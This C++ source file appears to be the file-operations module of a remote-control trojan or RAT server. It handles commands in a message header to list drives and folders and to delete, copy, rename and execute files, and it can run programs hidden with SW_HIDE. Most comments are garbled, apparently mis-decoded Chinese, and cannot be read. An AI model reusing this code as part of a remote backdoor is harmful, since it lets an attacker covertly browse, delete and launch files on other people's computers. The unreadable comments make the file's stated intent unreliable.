#include "StdAfx.h"
#include "FileOperator.h"
#include <stdio.h>
#include <shellapi.h>
#include "shlwapi.h"

void FileListDirver(char *pBuf, LPMsgHead lpMsgHead)
{
	DriverInfo driver;
	DWORD dwLen = 0;
	SHFILEINFO sfi;

	for (char chDriver = 'B'; chDriver <= 'Z'; chDriver++)
	{
		ZeroMemory(&driver, sizeof(DriverInfo));
		wsprintf(driver.driver, "%c:\\", chDriver);
		driver.drivertype = GetDriveTypeA(driver.driver);
		if (driver.drivertype >= 2) //������������ʶ���򷵻�0����ָ����Ŀ¼�����ڣ��򷵻�1
		{
			SHGetFileInfo(driver.driver, 0, &sfi, sizeof(sfi), SHGFI_DISPLAYNAME);
			lstrcpy(driver.display, sfi.szDisplayName);

			//д�뻺����
			memcpy(pBuf + dwLen, &driver, sizeof(DriverInfo));
			dwLen += sizeof(DriverInfo);
		}
	}

	lpMsgHead->dwCmd = CMD_SUCCEED;
	lpMsgHead->dwSize = dwLen;
}

//ö���ļ�·��
void FileListDirectory(char *pBuf, LPMsgHead lpMsgHead)
{
	HANDLE hFile;
	WIN32_FIND_DATA WFD;

	SHFILEINFO shfi;
	SYSTEMTIME systime;
	FILETIME localtime;

	FileInfo m_FileInfo;
	DWORD dwLen = 0;

	//���ҵ�һ���ļ�
	pBuf[lpMsgHead->dwSize] = 0;
	if ((hFile = FindFirstFile(pBuf, &WFD)) == INVALID_HANDLE_VALUE)
	{
		//�ļ��в��ɶ���Ŀ¼�޷�����
		lpMsgHead->dwCmd = CMD_DIRFLODERERR;
		lpMsgHead->dwSize = 0;
		return;
	}

	do	//����������Ϣ
	{
		memset(&shfi, 0, sizeof(shfi));
		SHGetFileInfo(WFD.cFileName,
			FILE_ATTRIBUTE_NORMAL,
			&shfi, sizeof(shfi),
			SHGFI_ICON | SHGFI_USEFILEATTRIBUTES | SHGFI_TYPENAME
			);

		if (lstrcmp(WFD.cFileName, ".") == 0 || lstrcmp(WFD.cFileName, "..") == 0)
			continue; //Ignore

		//д���ļ���Ϣ�ṹ
		ZeroMemory(&m_FileInfo, sizeof(FileInfo));
		lstrcpyn(m_FileInfo.cFileName, WFD.cFileName, 64);							  //�ļ���

		if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) //And Operate
		{
			m_FileInfo.iType = 1;													//Ŀ¼
			//lstrcpy(m_FileInfo.cAttrib, "�ļ���");								  //�ļ�����
		}
		else
		{
			m_FileInfo.iType = 2; //�ļ�
			DWORD dwSize = WFD.nFileSizeLow; //�ļ���С

			if (WFD.nFileSizeHigh != 0 || dwSize > 1024 * 1024 * 1024)
			{
				sprintf(m_FileInfo.cSize, "%-4.2f GB", (float)WFD.nFileSizeHigh * 4 + (float)dwSize / 1024 / 1024 / 1024);
			}
			else if (dwSize < 1024)//�����ʽ�����ַ�����ŵ��ɱ�ˣ�����KBǰ2���ո�
				sprintf(m_FileInfo.cSize, "%-4d B", dwSize);
			else if (dwSize > 1024 && dwSize < 1024 * 1024)
				sprintf(m_FileInfo.cSize, "%-4.2f KB", (float)dwSize / 1024);
			else if (dwSize > 1024 * 1024 && dwSize < 1024 * 1024 * 1024)
				sprintf(m_FileInfo.cSize, "%-4.2f MB", (float)dwSize / 1024 / 1024);
			else//������ɱ��ֻ����ô����
				sprintf(m_FileInfo.cSize, "Unknown");

			lstrcpy(m_FileInfo.cAttrib, shfi.szTypeName); //�ļ�����
		}

		//ת������ʱ�䵽����ʱ��
		FileTimeToLocalFileTime(&WFD.ftLastWriteTime, &localtime);
		FileTimeToSystemTime(&localtime, &systime);
		wsprintf(m_FileInfo.cTime, "%4d-%02d-%02d %02d:%02d:%02d",
			systime.wYear, systime.wMonth, systime.wDay, systime.wHour, systime.wMinute, systime.wSecond
			);

		memcpy(pBuf + dwLen, &m_FileInfo, sizeof(FileInfo));
		dwLen += sizeof(FileInfo);

		if (GetLastError() == ERROR_NO_MORE_FILES)
			break;
	} while (FindNextFile(hFile, &WFD));

	FindClose(hFile);

	lpMsgHead->dwCmd = CMD_SUCCEED;
	lpMsgHead->dwSize = dwLen;
}

void FileDelete(char *pBuf, LPMsgHead lpMsgHead)
{
	FileOpt m_FileOpt;
	memcpy(&m_FileOpt, pBuf, sizeof(m_FileOpt));

	if (DeleteFile(m_FileOpt.cScrFile))
		lpMsgHead->dwCmd = CMD_SUCCEED;
	else
		lpMsgHead->dwCmd = CMD_FAILED;
	lpMsgHead->dwSize = 0;
}

void FileExec(char *pBuf, LPMsgHead lpMsgHead)
{
	FileOpt m_FileOpt;
	memcpy(&m_FileOpt, pBuf, sizeof(m_FileOpt));

	DWORD ShowState = SW_HIDE;
	if (m_FileOpt.iSize >= 0) //No hide
	{
		ShowState = SW_NORMAL;

		if (!OpenUserDesktop())
		{
			lpMsgHead->dwCmd = CMD_FAILED;
			lpMsgHead->dwSize = 0;
			return;
		}
	}

	HINSTANCE hInst = ::ShellExecute(NULL, "open", m_FileOpt.cScrFile, NULL, NULL, ShowState);
	if ((INT)hInst < 32) //������ֵС��32���ִ���
		lpMsgHead->dwCmd = CMD_FAILED;
	else
		lpMsgHead->dwCmd = CMD_SUCCEED;

	lpMsgHead->dwSize = 0;
	return;
}

void FilePaste(char *pBuf, LPMsgHead lpMsgHead)
{
	FileOpt m_FileOpt;
	memcpy(&m_FileOpt, pBuf, sizeof(m_FileOpt));

	if (CopyFile(m_FileOpt.cScrFile, m_FileOpt.cDstFile, TRUE))
		lpMsgHead->dwCmd = CMD_SUCCEED;
	else
		lpMsgHead->dwCmd = CMD_FAILED;
	lpMsgHead->dwSize = 0;
}

void FileReName(char *pBuf, LPMsgHead lpMsgHead)
{
	FileOpt m_FileOpt;
	memcpy(&m_FileOpt, pBuf, sizeof(m_FileOpt));

	if (MoveFile(m_FileOpt.cScrFile, m_FileOpt.cDstFile))
		lpMsgHead->dwCmd = CMD_SUCCEED;
	else
		lpMsgHead->dwCmd = CMD_FAILED;
	lpMsgHead->dwSize = 0;
}
